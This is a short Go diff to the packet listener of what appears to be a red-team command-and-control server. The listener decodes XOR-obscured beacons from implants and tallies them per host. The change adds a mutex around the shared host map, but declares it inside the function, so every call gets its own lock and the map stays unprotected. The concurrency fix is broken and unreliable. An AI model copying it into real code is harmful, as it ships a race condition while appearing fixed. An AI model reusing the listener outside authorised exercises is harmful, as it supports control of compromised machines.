@@ -17,6 +17,7 @@ import (
 	"psovaya/pkg/watchdog"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/google/gopacket"
@@ -218,6 +219,9 @@ func cli() {
 }
 
 func processPacket(packet gopacket.Packet, listen chan Host) {
+	// Create Sync
+	var m sync.Mutex
+
 	// Get data from packet & Remove Identifier
 	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()), true)
 	data = rawsocket.XORCipher(data)
@@ -245,7 +249,8 @@ func processPacket(packet gopacket.Packet, listen chan Host) {
 		DstPort:  dstport,
 	}
 
-	// Update list of Implants
+	// Update list of Implants and Lock this part
+	m.Lock()
 	oldHostStat, ok := allHostStats[newHost.IP.String()]
 	if ok {
 		oldCount := oldHostStat.BeaconCount + 1
@@ -253,7 +258,7 @@ func processPacket(packet gopacket.Packet, listen chan Host) {
 	} else {
 		allHostStats[newHost.IP.String()] = HostStat{1, time.Now()}
 	}
-
+	m.Unlock()
 	// Update Pwnbord
 	// fmt.Println("[+] Hello :", newHost.Hostname, "(", newHost.IP, ")")
 	// Write host to channel
